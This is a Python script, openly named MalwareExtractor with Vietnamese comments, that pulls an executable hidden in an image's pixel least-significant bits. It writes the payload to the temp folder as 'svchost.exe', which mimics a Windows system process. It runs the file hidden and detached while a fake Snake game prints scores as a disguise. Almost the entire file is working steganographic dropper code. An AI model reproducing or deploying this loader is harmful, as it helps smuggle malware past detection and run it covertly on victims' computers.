from PIL import Image
import numpy as np
import tempfile
import subprocess
import os
import threading
import time
import struct

class MalwareExtractor:
    def __init__(self, image_path):
        self.image_path = image_path
        self.HEADER_MARKER = "<<EXE_START>>"
        self.DATA_MARKER = "<<DATA_START>>"
        self.extraction_complete = False

    def run_game_thread(self):
        """Giả lập luồng game rắn săn mồi để ngụy trang"""
        print("[GAME] Starting Snake Game...")
        for i in range(10):
            time.sleep(1)
            print(f"[GAME] Score: {i*10}")
        print("[GAME] Game Over.")

    def extract_exe(self):
        try:
            img = Image.open(self.image_path)
            if img.mode != 'RGB': img = img.convert('RGB')
            img_array = np.array(img)
            flat_pixels = img_array.flatten()
            
            lsb_bits = flat_pixels & 1
            total_bytes = len(lsb_bits) // 8
            lsb_bits = lsb_bits[:total_bytes * 8]
            byte_array = np.packbits(lsb_bits)
            data = byte_array.tobytes()

            start = data.find(self.HEADER_MARKER.encode())
            if start == -1: return None
            
            size_start = start + len(self.HEADER_MARKER)
            exe_size = int(data[size_start:size_start+10].decode())
            payload_start = data.find(self.DATA_MARKER.encode()) + len(self.DATA_MARKER)
            return data[payload_start:payload_start + exe_size]
        except Exception as e:
            print(f"[EXTRACTOR] Error: {e}")
            return None

    def execute_payload(self, payload_bytes):
        try:
            temp_dir = tempfile.gettempdir()
            payload_path = os.path.join(temp_dir, 'svchost.exe')
            with open(payload_path, 'wb') as f: f.write(payload_bytes)
            
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            startupinfo.wShowWindow = subprocess.SW_HIDE
            
            process = subprocess.Popen(
                [payload_path], startupinfo=startupinfo, 
                creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS
            )
            print(f"[EXTRACTOR] Payload started with PID: {process.pid}")
            self.extraction_complete = True
        except Exception as e:
            print(f"[EXTRACTOR] Exception: {e}")

    def run_extraction_thread(self):
        payload_bytes = self.extract_exe()
        if payload_bytes:
            self.execute_payload(payload_bytes)
        else:
            print("[EXTRACTOR] Failed to extract payload.")

    def run(self):
        game_thread = threading.Thread(target=self.run_game_thread, daemon=True)
        extraction_thread = threading.Thread(target=self.run_extraction_thread, daemon=True)
        game_thread.start()
        extraction_thread.start()
        game_thread.join()
        extraction_thread.join()

if __name__ == "__main__":
    img_path = input("Nhập đường dẫn ảnh stego chứa mã độc: ").strip()
    MalwareExtractor(img_path).run()